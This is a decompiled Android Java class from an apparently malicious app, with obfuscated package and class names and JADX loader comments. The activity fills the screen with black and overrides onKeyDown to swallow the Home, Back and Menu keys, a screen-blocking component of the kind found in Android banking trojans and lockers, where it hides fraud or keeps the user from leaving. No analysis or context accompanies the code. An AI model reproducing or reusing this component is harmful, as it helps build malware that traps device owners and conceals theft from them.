package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.Rect;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;

/* JADX INFO: loaded from: classes.dex */
public class zjwruw extends Activity {

    /* JADX INFO: renamed from: wocwvy.czyxoxmbauu.slsa.ncec.zjwruw$a */
    class C0044a extends View {

        /* JADX INFO: renamed from: a */
        Paint f477a;

        /* JADX INFO: renamed from: b */
        Rect f478b;

        public C0044a(Context context) {
            super(context);
            this.f477a = new Paint();
            this.f478b = new Rect();
        }

        @Override // android.view.View
        protected void onDraw(Canvas canvas) {
            canvas.drawColor(-16777216);
            canvas.drawRect(this.f478b, this.f477a);
        }
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(new C0044a(this));
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
    }
}
